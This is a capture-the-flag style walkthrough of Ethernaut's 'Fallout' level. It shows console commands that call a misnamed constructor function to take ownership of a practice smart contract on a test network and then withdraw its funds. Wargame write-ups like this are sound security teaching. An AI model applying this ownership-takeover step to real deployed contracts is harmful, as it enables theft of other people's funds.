---
title: "Fallout – Level 2 Walkthrough"
summary: "Step-by-step walkthrough for the second Ethernaut wargame level. Learn to exploit constructor typos, claim ownership, and withdraw funds from vulnerable smart contracts."
date: "Jun 24 2025"
tags:
- Ethereum
- Smart Contracts
- Security
- Ethernaut
- Walkthrough
---

# Fallout – Level 2 Walkthrough

Welcome to the second level of the **Ethernaut** wargame by [OpenZeppelin](https://ethernaut.openzeppelin.com/), focused on smart contract constructor vulnerabilities.

---

## Challenge Objective

You are given a contract with a misnamed constructor. Your goal is to:

- Exploit the typo to become the contract owner
- (Optionally) withdraw any contract balance
- Submit the instance to complete the level

---

## Prerequisites

Before you begin, ensure the following:

- **MetaMask** is installed and connected
- **Test ETH** is available (Goerli, Sepolia, etc.)
- Familiarity with using **browser DevTools** and executing JavaScript commands
- Access to the [Ethernaut Game](https://ethernaut.openzeppelin.com/)

---

## Getting Started

### 1. **Load the Level**

- Navigate to [ethernaut.openzeppelin.com](https://ethernaut.openzeppelin.com/)
- Select **"Fallout"** from the list of levels
- Click **"Get new instance"**
- Approve the MetaMask transaction to deploy your personalized challenge contract

Once the contract is deployed, it will inject a global object called `contract` into your browser console.

---

## Walkthrough – Step by Step

### 🗒️ Step 1: Check the Current Owner

```js
await contract.owner()
```
> The owner is likely the zero address or uninitialized.

---

### 🛠️ Step 2: Call the Misnamed Constructor

```js
await contract.Fal1out({ value: "1" })
```
> This function is public due to a typo (`Fal1out` instead of `Fallout`). Calling it sets you as the owner.

---

### 🔍 Step 3: Confirm Ownership

```js
await contract.owner()
```
> The owner should now be your address.

---

### 💸 Step 4: (Optional) Withdraw Allocations

If the contract holds ETH, you can withdraw it:

```js
await contract.collectAllocations()
```
> Only the owner can call this function.

---

### ✅ Step 5: Submit the Level

Click **“Submit instance”** in the UI and confirm the MetaMask transaction. Once successful, the level is marked as **completed**.

---

## 💡 What You Learn

- The importance of correct constructor naming in Solidity <0.7.0
- How typos can introduce critical vulnerabilities
- How to claim ownership by exploiting public functions
- The evolution to the `constructor` keyword in newer Solidity versions

---

## Concepts Covered

| Concept             | Description                                                                  |
| ------------------- | ---------------------------------------------------------------------------- |
| Constructor Typos   | Misnamed constructors are public functions, not constructors                 |
| Ownership Takeover  | Anyone can become owner by calling the typo’d function                      |
| Withdrawal Patterns | Only the owner can withdraw contract funds                                   |
| Web3 Interaction    | Using injected contract instances and console JS to interact                 |

---

## 📁 Resources

- [Ethernaut Game](https://ethernaut.openzeppelin.com/)
- [YouTube Walkthrough](https://www.youtube.com/watch?v=1E0BTVudurM)
---
